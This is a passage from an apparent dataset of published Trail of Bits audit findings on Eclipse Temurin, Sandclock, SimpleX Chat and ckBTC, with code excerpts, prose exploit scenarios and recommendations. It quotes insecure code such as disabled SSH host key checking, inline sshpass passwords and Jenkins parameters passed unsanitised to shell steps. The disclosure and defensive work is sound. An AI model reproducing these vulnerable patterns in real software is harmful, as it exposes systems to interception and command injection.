Eclipse Foundation has conrmed that these parameters can be specied in a Jenkins job web form; however, access to these forms is restricted. 45 OSTIF Eclipse: Temurin Security Assessment Exploit Scenario An attacker sends a malicious shell payload through the TARGET_OS , ARCHITECTURE , VARIANT , DOCKER_IMAGE , DOCKER_ARGS , or AQA_REF Jenkins job parameters. The input then reaches the sh process, which allows the execution of arbitrary shell scripts. The attacker is able to execute arbitrary commands by using shell operators such as ; , && , or || , and to append additional commands. Recommendations Short term, instead of specifying shell script commands to run in the sh step, use Groovy code or Jenkins plugins to accomplish the same action. For example, instead of rm or curl , use the deleteDir step or the File Operations plugin. Instead of using shell scripts for Docker operations, use the Docker Pipeline plugin where possible. If additional Docker command ags are necessary, use Boolean inputs that enable or disable specic ags instead of interpolating arbitrary string input. Long term, implement static analysis rules to automatically detect when user input is passed to sh steps. References   Jenkins, sh : Shell Script Docker Pipeline plugin, Advanced usage 46 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Docker commands specify root user in containers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "Docker may specify a container user during the build process in a Dockerle or at runtime on the command line. Running containers as root violates the principle of least privilege and should be avoided. The following Docker commands specify root as the container user: docker run -it -u root -d --name= \" ${ dockerContainer } \" \" ${ dockerImage } \" docker exec -u root -i \" ${ dockerContainer } \" sh -c \"git clone https://github.com/ibmruntimes/openj9-openjdk- ${ jdk } \" docker exec -u root -i \" ${ dockerContainer } \" sh -c \"cd openj9-openjdk- ${ jdk } && bash ./get_source.sh && bash ./configure --with-freemarker-jar=/root/freemarker.jar && make all\" Figure 18.1: Commands specifying root container users ( temurin-build/docker/buildDocker.sh:141143 ) Recommendations Short term, have any necessary root actions performed at build-time in the Dockerle, and have containers run as a lower privileged user at runtime. Long term, once containers are no longer being run as root, enable the --security-opt=no-new-privileges ag when running Docker, in order to prevent privilege escalation using setuid or setgid binaries. 47 OSTIF Eclipse: Temurin Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. SSH client disables host key verication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "SSH clients maintain a list of known-good hosts they have connected to before. Host key verication is then used to prevent person-in-the-middle attacks. There are a number of locations across the target repositories that disable SSH host key verication, such as when connecting to a Nagios instance: Reverse_Tunnel = \"ssh -o StrictHostKeyChecking=no -f -n -N -R $REMOTE_PORT :127.0.0.1: $LOCAL_PORT $USER_NAME @ $REMOTE_HOST -p $LOGIN_PORT -i $IDENTITY_KEY \" Figure 13.1: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/Supporting_Scripts/Nagios_Ansible_Confi g_tool/Nagios_RemoteTunnel.sh:1821 ) Nagios_Login = ` su nagios -c \"ssh -o StrictHostKeyChecking=no $Sys_IPAddress uptime\"` Figure 13.2: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/Supporting_Scripts/Nagios_Ansible_Confi g_tool/Nagios_Ansible_Config_tool.sh:170 ) command : ssh -o StrictHostKeyChecking=no root@{{ Nagios_Master_IP }} \"/usr/local/nagios/Nagios_Ansible_Config_tool/Nagios_Ansible_Config_tool.sh {{ ansible_distribution }} {{ ansible_architecture }} {{ inventory_hostname }} {{ ansible_host }} {{ provider }} {{ ansible_port }} \" Figure 13.3: Nagios SSH connection disabling SSH host key verication ( infrastructure/ansible/playbooks/AdoptOpenJDK_Unix_Playbook/roles/Nagios _Master_Config/tasks/main.yml:25 ) 37 OSTIF Eclipse: Temurin Security Assessment There are also a number of benign locations where SSH host key verication is disabled. These locations are considered benign because they are connecting to internal, short-lived, or local-only services. They are included here for completenesss sake: launcher = new SSHLauncher( machines[index], 22 , params.SSHCredentialId.isEmpty() ? Constants.SSH_CREDENTIAL_ID : params.SSHCredentialId, null , null , null , null , null , null , null , new NonVerifyingKeyVerificationStrategy() ); Figure 13.4: Groovy SSH launcher disabling host key verication ( jenkins-helper/Jenkins_jobs/CreateNewNode.groovy:3843 ) sshpass -p 'password' ssh linux@localhost -p \" $PORTNO \" -o StrictHostKeyChecking =no 'uname -a' Figure 13.5: Test script disabling host key verication ( infrastructure/ansible/pbTestScripts/qemuPlaybookCheck.sh:273 ) ssh_args = \" $ssh_args -o StrictHostKeyChecking=no\" Figure 13.6: Test script disabling host key verication ( infrastructure/ansible/pbTestScripts/vagrantPlaybookCheck.sh:253 ) Exploit Scenario An attacker is in a privileged network position relative to a system initiating an SSH connection and is able to actively intercept and modify the systems network trac. Because SSH host key verication is disabled, the attacker can intercept SSH network trac and perform a person-in-the-middle attack. Recommendations Short term, in all locations where SSH host key verication is currently disabled, have the code gather the hosts SSH public key and add it out of band to the clients known_hosts le. Long term, implement static analysis rules to automatically detect when SSH host key verication is disabled. 38 OSTIF Eclipse: Temurin Security Assessment 14. Compiler mitigations are not enabled Severity: Informational Diculty: High Type: Conguration Finding ID: TOB-TEMURIN-14 Target: temurin-build/sbin/build.sh",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Incorrect Dependabot conguration lename ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The infrastructure repository has a Dependabot conguration le, used to congure the Dependabot bot, which detects out-of-date dependencies. However, this le is incorrectly named dependabot rather than dependabot.yml , preventing the bot from being run on this repository. In order to test this, we created a private copy of the infrastructure repository and renamed the dependabot le to dependabot.yml . Dependabot detected many out-of-date Github Actions dependencies. We did not determine whether any of the out-of-date dependencies present in the infrastructure repository have security problems that could aect the Temurin infrastructure or build system. Recommendations Short term, rename the dependabot le to dependabot.yml . 48 OSTIF Eclipse: Temurin Security Assessment A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. receiveFlashLoan does not account for fees ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf",
        "body": "The receiveFlashLoan functions of the scWETHv2 and scUSDCv2 vaults ignore the Balancer ash loan fees and repay exactly the amount that was loaned. This is not currently an issue because the Balancer vault does not charge any fees for ash loans. However, if Balancer implements fees for ash loans in the future, the Sandclock vaults would be prevented from withdrawing investments back into the vault. function flashLoan ( IFlashLoanRecipient recipient, IERC20[] memory tokens, uint256 [] memory amounts, bytes memory userData ) external override nonReentrant whenNotPaused { uint256 [] memory feeAmounts = new uint256 [](tokens.length); uint256 [] memory preLoanBalances = new uint256 [](tokens.length); for ( uint256 i = 0 ; i < tokens.length; ++i) { IERC20 token = tokens[i]; uint256 amount = amounts[i]; preLoanBalances[i] = token.balanceOf( address ( this )); feeAmounts[i] = _calculateFlashLoanFeeAmount(amount); token.safeTransfer( address (recipient), amount); } recipient.receiveFlashLoan(tokens, amounts, feeAmounts , userData); for ( uint256 i = 0 ; i < tokens.length; ++i) { IERC20 token = tokens[i]; uint256 preLoanBalance = preLoanBalances[i]; uint256 postLoanBalance = token.balanceOf( address ( this )); uint256 receivedFeeAmount = postLoanBalance - preLoanBalance; _require(receivedFeeAmount >= feeAmounts[i]); _payFeeAmount(token, receivedFeeAmount); } } Figure 1.1: Abbreviated code showing the receivedFeeAmount check in the Balancer flashLoan method in 0xBA12222222228d8Ba445958a75a0704d566BF2C8#code#F5#L78 In the Balancer flashLoan function , shown in gure 1.1, the contract calls the recipients receiveFlashLoan function with four arguments: the addresses of the tokens loaned, the amounts for each token, the fees to be paid for the loan for each token, and the calldata provided by the caller. The Sandclock vaults ignore the fee amount and repay only the principal, which would lead to reverts if the fees are ever changed to nonzero values. Although this problem is present in multiple vaults, the receiveFlashLoan implementation of the scWETHv2 contract is shown in gure 1.2 as an illustrative example: function receiveFlashLoan ( address [] memory , uint256 [] memory amounts, uint256 [] memory , bytes memory userData) external { _isFlashLoanInitiated(); // the amount flashloaned uint256 flashLoanAmount = amounts[ 0 ]; // decode user data bytes [] memory callData = abi.decode(userData, ( bytes [])); _multiCall(callData); // payback flashloan asset.safeTransfer( address (balancerVault), flashLoanAmount ); _enforceFloat(); } Figure 1.2: The feeAmounts parameter is ignored by the receiveFlashLoan method. ( sandclock-contracts/src/steth/scWETHv2.sol#L232L249 ) Exploit Scenario After Sandclocks scUSDv2 and scWETHv2 vaults are deployed and users start depositing assets, the Balancer governance system decides to start charging fees for ash loans. Users of the Sandclock protocol now discover that, apart from the oat margin, most of their funds are locked because it is impossible to use the ash loan functions to withdraw vault assets from the underlying investment pools. Recommendations Short term, use the feeAmounts parameter in the calculation for repayment to account for future Balancer ash loan fees. This will prevent unexpected reverts in the ash loan handler function. Long term, document and justify all ignored arguments provided by external callers. This will facilitate a review of the systems third-party interactions and help prevent similar issues from being introduced in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Reward token distribution rate can diverge from reward token balance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf",
        "body": "The privileged distributor role is responsible for transferring reward tokens to the RewardTracker contract and then passing the number of tokens sent as the _reward parameter to the notifyRewardAmount method. However, the _reward parameter provided to this method can be larger than the number of reward tokens transferred. Given the accounting for leftover rewards, such a situation would be dicult to recover from. /// @notice Lets a reward distributor start a new reward period. The reward tokens must have already /// been transferred to this contract before calling this function. If it is called /// when a reward period is still active, a new reward period will begin from the time /// of calling this function, using the leftover rewards from the old reward period plus /// the newly sent rewards as the reward. /// @dev If the reward amount will cause an overflow when computing rewardPerToken, then /// this function will revert. /// @param _reward The amount of reward tokens to use in the new reward period. function notifyRewardAmount ( uint256 _reward ) external onlyDistributor { _notifyRewardAmount(_reward); } Figure 2.1: The comment on the notifyRewardAmount method hints at an unenforced assumption that the number of reward tokens transferred must be equal to the _reward parameter provided. ( sandclock-contracts/src/staking/RewardTracker.sol#L185L195 ) If a _reward value smaller than the actual number of transferred tokens is provided, the situation can be xed by calling notifyRewardAmount again with a _reward parameter that accounts for the dierence between the RewardTracker contracts actual token balance and the rewards already scheduled for distribution. This solution is possible because the _notifyRewardAmount helper function accounts for leftover rewards if it is called during an ongoing reward period. function _notifyRewardAmount ( uint256 _reward ) internal { ... uint64 rewardRate_ = rewardRate; uint64 periodFinish_ = periodFinish; uint64 duration_ = duration; ... if ( block.timestamp >= periodFinish_) { newRewardRate = _reward / duration_; } else { uint256 remaining = periodFinish_ - block.timestamp ; uint256 leftover = remaining * rewardRate_; newRewardRate = (_reward + leftover ) / duration_; } Figure 2.2: The accounting for leftover rewards in the _notifyRewardAmount helper method ( sandclock-contracts/src/staking/RewardTracker.sol#L226L262 ) This accounting for leftover rewards, however, makes the situation dicult to recover from if a _reward parameter that is too large is provided to the notifyRewardAmount method. As shown by the arithmetic in gure 2.2, if the reward period has not nished, the code for creating the newRewardRate value can only add to the reward distribution, not subtract from it. The only way to bring a too-large reward distribution back in line with the RewardTracker contracts reward token balance is to transfer additional reward tokens to the contract. Exploit Scenario The RewardTracker distributor transfers 10 reward tokens to the RewardTracker contract and then mistakenly calls the notifyRewardAmount method with a _reward parameter of 100. Some users call the claimRewards method early and receive inated rewards until the contracts balance is depleted, leaving later users unable to claim any rewards. To recover, the distributor either needs to provide another 90 reward tokens to the RewardTracker contract or accept the reputational loss of allowing this miscongured reward period to nish before resetting the reward payouts correctly during the next period. Recommendations Short term, modify the _notifyRewardAmount helper function to reset the rewardRate so that it is in line with the current rewardToken balance and the time remaining in the reward period. This change could also allow the fetchRewards method to maintain its current behavior but with only a single rewardToken.balanceOf external call. Long term, review the internal accounting state variables and document the ways in which they are inuenced by the actual ow of funds. Pay attention to any internal accounting values that can be inuenced by external sources, including privileged accounts, and reexamine the systems assumptions surrounding the ow of funds.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Miscalculation in beforeWithdraw can leave the vault with less than minimum oat ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf",
        "body": "When a user wants to redeem or withdraw, the beforeWithdraw function is called with the number of assets to be withdrawn as the assets parameter. This function makes sure that if the value of the float parameter (that is, the available assets in the vault) is not enough to pay for the withdrawal, the strategy gets some assets back from the pools to be able to pay. function beforeWithdraw ( uint256 assets , uint256 ) internal override { uint256 float = asset.balanceOf( address ( this )); if (assets <= float) return ; uint256 minimumFloat = minimumFloatAmount; uint256 floatRequired = float < minimumFloat ? minimumFloat - float : 0 ; uint256 missing = assets + floatRequired - float; _withdrawToVault(missing); } Figure 3.1: The aected code in sandclock-contracts/src/steth/scWETHv2.sol#L386L396 When the float value is enough, the function returns and the withdrawal is paid with the existing oat. If the float value is not enough, the missing amount is recovered from the pools via the adapters. The issue lies in the calculation of the missing parameter: it does not guarantee that the float value remaining after the withdrawal is at least the value of the minimumFloatAmount parameter. The consequence is that the calculation always leaves a oat equal to floatRequired in the vault. If this value is small enough, it can cause users to waste gas when withdrawing small amounts because they will need to pay for the gas-intensive _withdrawToVault action. This eclipses the usefulness of having the oat in the vault. The correct calculation should be uint256 missing = assets + minimumFloat - float; . Using this correct calculation would make the calculation of the floatRequired parameter unnecessary as it would no longer be required or used in the rest of the code. Exploit Scenario The value for minimumFloatAmount is set to 1 ether in the scWETHv2 contract. For this scenario, suppose that the current oat is exactly equal to minimumFloatAmount . Alice wants to withdraw 0.15 WETH from her invested amount. Because this amount is less than the current oat, her withdrawal is paid from the vault assets, leaving the oat equal to 0.85 WETH after the operation. Then, Bill wants to withdraw 0.9 WETH, but the vault has no available assets to pay for it. In this case, when beforeWithdraw is called, Bill has to pay gas for the call to _withdrawToVault , which is an expensive action because it includes gas-intensive operations such as loops and a ash loan. After Bills withdrawal, the oat in the vault is 0.15 WETH. This is a relatively small amount compared with minimumFloatValue , and it will likely make the next withdrawing/redeeming user also have to pay for the call to _withdrawToVault . Recommendations Short term, replace the calculation of the missing amount to be withdrawn on line 393 of the scWETHv2 contract with assets + minimumFloat - float . This calculation will ensure that the minimum oat restriction is enforced after withdrawals. It will take the required oat into consideration, so the separate calculation of floatRequired on line 392 of scWETHv2 would no longer be required. Long term, add unit or fuzz tests to make sure that the vault has an amount of assets equal to or greater than the minimum expected amount at all times.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Last user in scWETHv2 vault will not be able to withdraw their funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf",
        "body": "When a user wants to withdraw, the withdrawal amount is checked against the current vault oat (the uninvested assets readily available in the vault). If the withdrawal amount is less than the oat, the amount is paid from the available balance; otherwise, the protocol has to disinvest from the strategies to get the required assets to pay for the withdrawal. The issue with this approach is that in order to maintain a oat equal to the minimumFloatValue parameter in the vault, the value to be disinvested from the strategies is calculated in the beforeWithdraw function, and its correct value is equal to the sum of the amount to be withdrawn and the minimum oat minus the current oat. If there is only one user remaining in the vault and they want to withdraw, this enforcement will not allow them to do so, because there will not be enough invested in the strategies to leave a minimum oat in the vault after the withdrawal. They would only be able to withdraw their assets minus the minimum oat at most. The code for the _withdrawToVault function is shown in gure 4.1. The line highlighted in the gure would cause the revert in this situation, as there would not be enough invested to supply the requested amount. function _withdrawToVault ( uint256 _amount ) internal { uint256 n = protocolAdapters.length(); uint256 flashLoanAmount ; uint256 totalInvested_ = _totalCollateralInWeth() - totalDebt(); bytes [] memory callData = new bytes [](n + 1 ); uint256 flashLoanAmount_ ; uint256 amount_ ; uint256 adapterId ; address adapter ; for ( uint256 i ; i < n; i++) { (adapterId, adapter) = protocolAdapters.at(i); (flashLoanAmount_, amount_) = _calcFlashLoanAmountWithdrawing(adapter, _amount, totalInvested_); flashLoanAmount += flashLoanAmount_; callData[i] = abi.encodeWithSelector( this .repayAndWithdraw.selector, adapterId, flashLoanAmount_, priceConverter.ethToWstEth(flashLoanAmount_ + amount_) ); } // needed otherwise counted as loss during harvest totalInvested -= _amount; callData[n] = abi.encodeWithSelector(scWETHv2.swapWstEthToWeth.selector, type( uint256 ).max, slippageTolerance); uint256 float = asset.balanceOf( address ( this )); _flashLoan(flashLoanAmount, callData); emit WithdrawnToVault(asset.balanceOf( address ( this )) - float); } Figure 4.1: The aected code in sandclock-contracts/src/steth/scWETHv2.sol#L342L376 Additionally, when this revert occurs, an integer overow is given as the reason, which obscures the real reason and can make the users experience more confusing. Exploit Scenario Bob is the only remaining user in a scWETHv2 vault, and he has 2 ether invested. He wants to withdraw his assets, but all of his calls to the withdrawal function keep reverting due to an integer overow. He keeps trying, wasting gas in the process, until he discovers that the maximum amount he is allowed to withdraw is around 1 ether. The rest of his funds are locked in the vault until the keeper makes a manual call to withdrawToVault or until the admin lowers the minimum oat value. Recommendations Short term, x the calculation of the amount to be withdrawn and make sure that it never exceeds the total invested amount. Long term, add end-to-end unit or fuzz tests that are representative of the way multiple users can interact with the protocol. Test for edge cases involving various numbers of users, investment amounts, and critical interactions, and make sure that the protocols invariants hold and that users do not lose access to funds in the event of such edge cases.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "5. Lido stake rate limit could lead to unexpected reverts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf",
        "body": "To mitigate the eects of a surge in demand for stETH on the deposit queue, Lido has implemented a rate limit for stake submissions. This rate limit is ignored by the lidoSwapWethToWstEth method of the Swapper library, potentially leading to unexpected reversions. The Lido stETH integration guide states the following: To avoid [reverts due to the rate limit being hit], you should check if getCurrentStakeLimit() >= amountToStake , and if it's not you can go with an alternative route. function lidoSwapWethToWstEth ( uint256 _wethAmount ) external { // weth to eth weth.withdraw(_wethAmount); // stake to lido / eth => stETH stEth.submit{value: _wethAmount}( address ( 0x00 )); // stETH to wstEth uint256 stEthBalance = stEth.balanceOf( address ( this )); ERC20( address (stEth)).safeApprove( address (wstETH), stEthBalance); wstETH.wrap(stEthBalance); } Figure 5.1: The submit method is subject to a rate limit that is not taken into account. ( sandclock-contracts/src/steth/Swapper.sol#L130L142 ) Exploit Scenario A surge in demand for Ethereum validators leads many people using Lido to stake ETH, causing the Lido rate limit to be hit, and the submit method of the stEth contract begins to revert. As a result, the Sandclock keeper is unable to deposit despite the presence of alternate routes to obtain stETH, such as through Curve or Balancer. Recommendations Short term, have the lidoSwapWethToWstEth method of the Swapper library check whether the amount being deposited is less than the value returned by the getCurrentStakeLimit method of the stEth contract. If it is not, have the code use ZeroEx to swap or revert with a message that clearly communicates the reason for the failure. Long term, review the documentation for all third-party interactions and note any situations in which the integration could revert unexpectedly. If such reversions are acceptable, clearly document how they could occur and include a justication for this acceptance in the inline comments.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Chainlink oracles could return stale price data ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-07-sandclock-securityreview.pdf",
        "body": "The latestRoundData() function from Chainlink oracles returns ve values: roundId , answer , startedAt , updatedAt , and answeredInRound . The PriceConverter contract reads only the answer value and discards the rest. This can cause outdated prices to be used for token conversions, such as the ETH-to-USDC conversion shown in gure 6.1. function ethToUsdc ( uint256 _ethAmount ) public view returns ( uint256 ) { ( , int256 usdcPriceInEth ,,, ) = usdcToEthPriceFeed.latestRoundData(); return _ethAmount.divWadDown( uint256 (usdcPriceInEth) * C.WETH_USDC_DECIMALS_DIFF); } Figure 6.1: All returned data other than the answer value is ignored during the call to a Chainlink feeds latestRoundData method. ( sandclock-contracts/src/steth/PriceConverter.sol#L67L71 ) According to the Chainlink documentation , if the latestRoundData() function is used, the updatedAt value should be checked to ensure that the returned value is recent enough for the application. Similarly, the LUSD/ETH price feed used by the scLiquity vault is an intermediate contract that calls the deprecated latestAnswer method on upstream Chainlink oracles. contract LSUDUsdToLUSDEth is IPriceFeed { IPriceFeed public constant LUSD_USD = IPriceFeed( 0x3D7aE7E594f2f2091Ad8798313450130d0Aba3a0 ); IPriceFeed public constant ETH_USD = IPriceFeed( 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419 ); function latestAnswer () external view override returns ( int256 ) { return (LUSD_USD.latestAnswer() * 1 ether) / ETH_USD.latestAnswer(); } } Figure 6.2: The custom latestAnswer method in 0x60c0b047133f696334a2b7f68af0b49d2F3D4F72#code#L19 The Chainlink API reference ags the latestAnswer method as (Deprecated - Do not use this function.). Note that the upstream IPriceFeed contracts called by the intermediate LSUDUsdToLUSDEth contract are upgradeable proxies. It is possible that the implementations will be updated to remove support for the deprecated latestAnswer method, breaking the scLiquity vaults lusd2eth price feed. Because the oracle price feeds are used for calculating the slippage tolerance, a dierence may exist between the oracle price and the DEX pool spot price, either due to price update delays or normal price uctuations or because the feed has become stale. This could lead to two possible adverse scenarios:   If the oracle price is signicantly higher than the pool price, the slippage tolerance could be too loose, introducing the possibility of an MEV sandwich attack that can prot on the excess. If the oracle price is signicantly lower than the pool price, the slippage tolerance could be too tight, and the transaction will always revert. Users will perceive this as a denial of service because they would not be able to interact with the protocol until the price dierence is settled. Exploit Scenario Bob has assets invested in a scWETHv2 vault and wants to withdraw part of his assets. He interacts with the contracts, and every withdrawal transaction he submits reverts due to a large dierence between the oracle and pool prices, leading to failed slippage checks. This results in a waste of gas and leaves Bob confused, as there is no clear indication of where the problem lies. Recommendations Short term, make sure that the oracles report up-to-date data, and replace the external LUSD/ETH oracle with one that supports verication of the latest update timestamp. In the case of stale oracle data, pause price-dependent Sandclock functionality until the oracle comes back online or the admin replaces it with a live oracle. Long term, review the documentation for Chainlink and other oracle integrations to ensure that all of the security requirements are met to avoid potential issues, and add tests that take these possible situations into account. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. X3DH does not apply HKDF to generate secrets ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf",
        "body": "The extended triple Die-Hellman (X3DH) key agreement protocol works by computing three separate Die-Hellman computations between pairs of keys. In particular, each party has a longer term private and public key pair as well as a more short-term private and public key pair. The three separate Die-Hellman computations are performed between the various pairs of long term and short term keys. The key agreement is performed this way to simultaneously authenticate each party and provide forward secrecy, which limits the impact of compromised keys. When performing the X3DH key agreement, the nal shared secret is formed by applying HKDF to the concatenation of all three Die-Hellman outputs. The computation is performed this way so that the shared secret depends on the entropy of all three Die-Hellman computations. If the X3DH protocol is being used to generate multiple shared secrets (which is the case for SimpleX), then these secrets should be formed by computing the HKDF over all three Die-Hellman outputs and then splitting the output of HKDF into separate shared secrets. However, as shown in Figure 1.1, the SimpleX implementation of X3DH uses each of the three Die-Hellman outputs as separate secrets for the Double Ratchet protocol, rather than inputting them into HKDF and splitting the output. x3dhSnd :: DhAlgorithm a => PrivateKey a -> PrivateKey a -> E2ERatchetParams a -> RatchetInitParams x3dhSnd spk1 spk2 ( E2ERatchetParams _ rk1 rk2) = x3dh (publicKey spk1, rk1) (dh' rk1 spk2) (dh' rk2 spk1) (dh' rk2 spk2) x3dhRcv :: DhAlgorithm a => PrivateKey a -> PrivateKey a -> E2ERatchetParams a -> RatchetInitParams x3dhRcv rpk1 rpk2 ( E2ERatchetParams _ sk1 sk2) = x3dh (sk1, publicKey rpk1) (dh' sk2 rpk1) (dh' sk1 rpk2) (dh' sk2 rpk2) x3dh :: DhAlgorithm a => ( PublicKey a, PublicKey a) -> DhSecret a -> DhSecret a -> DhSecret a -> RatchetInitParams x3dh (sk1, rk1) dh1 dh2 dh3 = RatchetInitParams {assocData, ratchetKey = RatchetKey sk, sndHK = Key hk, rcvNextHK = Key nhk} where assocData = Str $ pubKeyBytes sk1 <> pubKeyBytes rk1 (hk, rest) = B .splitAt 32 $ dhBytes' dh1 <> dhBytes' dh2 <> dhBytes' dh3 (nhk, sk) = B .splitAt 32 rest Figure 1.1: simplexmq/src/Simplex/Messaging/Crypto/Ratchet.hs#L98-L112 Performing the X3DH protocol this way will increase the impact of compromised keys and have implications for the theoretical forward secrecy of the protocol. To see why this is the case, consider what happens if a single key pair, (sk2 , spk2) , is compromised. In the current implementation, if an attacker compromises this key pair, then they can immediately recover the header key, hk , and the ratchet key, sk . However, if this were implemented by rst computing the HKDF over all three Die-Hellman outputs, then the attacker would not be able to recover these keys without also compromising another key pair. Note that SimpleX does not perform X3DH with long-term identity keys, as the SimpleX protocol does not rely on long-term keys to identify client devices. Therefore, the impact of compromising a key will be less severe, as it will aect only the secrets of the current session. Exploit Scenario An attacker is able to compromise a single X3DH key pair of a client using SimpleX chat. Because of how the X3DH is performed, they are able to then compromise the clients header key and ratchet key and can decrypt some of their messages. Recommendations Short term, adjust the X3DH implementation so that HKDF is computed over the concatenation of dh1 , dh2 , and dh3 before obtaining the ratchet key and header keys.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. The pad function is incorrect for long messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf",
        "body": "The pad function from the Simplex.Messaging.Crypto module uses the fromIntegral function, resulting in an integer overow bug that leads to incorrect length encoding for messages longer than 65535 bytes (Figure 2.1). At the moment, the function appears to be called only with messages that are less than that; however, due to the general nature of the module, there is a risk of using a pad with longer messages as the message length assumption is not documented. pad :: ByteString -> Int -> Either CryptoError ByteString pad msg paddedLen | padLen >= 0 = Right $ encodeWord16 (fromIntegral len) <> msg <> B .replicate padLen '#' | otherwise = Left CryptoLargeMsgError where len = B .length msg padLen = paddedLen - len - 2 Figure 2.1: simplexmq/src/Simplex/Messaging/Crypto.hs#L805-L811 Exploit Scenario The pad function is used on messages longer than 65535 bytes, introducing a security vulnerability. Recommendations Short term, change the pad function to check the message length if it ts into 16 bits and return CryptoLargeMsgError if it does not. Long term, write unit tests for the pad function. Avoid using fromIntegral to cast to smaller integer types; instead, create a new function that will safely cast to smaller types that returns Maybe .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. The unPad function throws exception for short messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf",
        "body": "The unPad function throws an undocumented exception when the input is empty or a single byte. This is due to the decodeWord16 function, which throws an IOException if the input is not exactly two bytes. The unPad function does not appear to be used on such short inputs in the current code. unPad :: ByteString -> Either CryptoError ByteString unPad padded | B .length rest >= len = Right $ B .take len rest | otherwise = Left CryptoLargeMsgError where ( lenWrd , rest) = B .splitAt 2 padded len = fromIntegral $ decodeWord16 lenWrd Figure 3.1: simplexmq/src/Simplex/Messaging/Crypto.hs#L813-L819 Exploit Scenario The unPad function takes a user-controlled input and throws an exception that is not handled in a thread that is critical to the functioning of the protocol, resulting in a denial of service. Recommendations Short term, validate the length of the input passed to the unPad function and return an error if the input is too short. Long term, write unit tests for the unPad function to ensure the validation works as intended.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Key material resides in unpinned memory and is not cleared after its lifetime ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/SimpleXChat.pdf",
        "body": "The key material generated and processed by the SimpleXMQ library resides in unpinned memory, and the data is not cleared out from the memory as soon as it is no longer used. The key material will stay on the Haskell heap until it is garbage collected and overwritten by other data. Combined with unpinned memory pages where the Haskells heap is allocated, this creates a risk of paging out unencrypted memory pages with the key material to disk. Because the memory management is abstracted away by the language, the manual memory management required to pin and zero-out the memory in garbage-collected language as Haskell is challenging. This issue does not concern the communication security; only device security is aected. Exploit Scenario The unencrypted key material is paged out to the hard drive, where it is exposed and can be stolen by an attacker. Recommendations Short term, investigate the use of mlock/mlockall on supported platforms to prevent memory pages that contain key material to be paged out. Explicitly zero out the key material as soon as it is no longer needed. Long term, document the key material memory management and the threat model around it.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. KYT canister is centralized on third-party provider ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf",
        "body": "The KYT canister relies entirely on the third-party provider Chainalysis to clear Bitcoin transactions and is tightly integrated with it, creating a single point of failure in an otherwise highly decentralized system. It is possible to upgrade the KYT canister to a mode that clears all transactions, but this likely requires manual intervention. Exploit Scenario Chainalysis is compromised and marks all UTXOs as tainted, eectively denying the ckBTC to/from BTC transfer service for all users. Recommendations Short term, document this limitation and run monitoring to detect whether there is a risk that Chainalysis will become unreliable. Long term, add additional KYT providers and cross-check the results. This will ensure that a single provider cannot launch a denial-of-service attack against the KYT canister, and that the team is alerted if any anomalies arise.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Risk of amount underow when retrieving BTC ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-ckBTC-securityreview.pdf",
